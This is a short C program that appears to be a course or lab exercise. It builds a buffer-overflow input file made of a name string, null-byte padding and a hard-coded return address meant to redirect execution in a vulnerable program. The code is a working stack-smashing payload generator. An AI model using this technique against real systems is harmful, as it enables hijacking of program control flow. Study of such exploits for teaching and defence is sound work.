#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
    int i;
    const char* name = "Tansha Vugarwal";
    unsigned long ulReturnAddress = 0x400858;

    FILE *psFile;

    psFile = fopen("data", "w");

    /* Printing out name */
    fprintf(psFile, "%s", name);

    for (i = 0; i < 33; i++)
    {
        putc('\0', psFile); /* Writes 00000000 */
    }

    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 1;
}

